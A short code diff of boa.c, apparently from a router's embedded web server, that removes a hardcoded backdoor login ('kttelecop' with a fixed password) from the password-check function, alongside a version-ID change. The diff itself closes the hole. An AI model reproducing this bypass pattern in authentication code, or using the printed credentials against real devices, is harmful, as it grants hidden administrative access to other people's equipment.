@@ -21,7 +21,7 @@
  *
  */
 
-/* $Id: boa.c,v 1.10 2015/04/07 06:42:02 ysrt305x Exp $*/
+/* $Id: boa.c,v 1.1 2017/10/26 05:43:33 sgbcmac Exp $*/
 
 #include "boa.h"
 #include <sys/resource.h>
@@ -195,10 +195,6 @@ static void init_id_pass(void)
 /* return 0: success , return 1: failed */
 int check_password_cache(char *id, char *passwd)
 {
-#ifdef USE_KTT_CONFIG
-        if(!strcmp(id,"kttelecop") && !strcmp(passwd,"15880112!"))
-                return 0;
-#endif
         if(strcmp(id,id_cache)) return 1;
 
         if(!strcmp(password_cache,"") && !strcmp(passwd,""))
